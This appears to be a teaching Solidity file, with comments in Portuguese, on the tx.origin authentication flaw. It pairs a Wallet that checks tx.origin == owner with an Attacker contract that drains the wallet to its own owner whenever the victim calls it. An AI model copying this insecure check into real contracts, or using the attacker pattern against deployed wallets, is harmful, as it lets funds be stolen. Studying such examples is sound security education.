// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

/**
* Tx.origin é uma variável global no Solidity que retorna o endereço da conta de propriedade externa (EOA) original 
* que iniciou a transação. É diferente de msg.sender, que retorna a conta imediata (conta externa ou contratual) 
* que invocou determinada função.
*/

/**
Se houver múltiplas invocações de funções ao longo de diferentes contratos em determinada cadeia de transações, 
tx.origin sempre se referirá ao EOA que o iniciou, independentemente da pilha de contratos envolvidos, 
enquanto msg.sender se referirá à última instância (EOA ou smart contrato) a partir do qual cada função nessa 
cadeia de transações foi chamada.

*/

contract Wallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable{}

    function withdrawFunds(address to) public {
        // utilize o msg.sender == owner para validar evitando o ataque
        require(tx.origin == owner, "Not owner");
        uint contractBalance = address(this).balance;
        (bool suceed,) = to.call{value:contractBalance}("");
        require(suceed, "Failed withdrawal");
    }
}

contract Attacker {
    address public owner;
    Wallet public victim; 
    constructor(Wallet _victim) {
        owner = msg.sender;
        victim = Wallet(_victim);
    }

    function withdrawFunds(address to) external  {
        victim.withdrawFunds(owner);
    }
}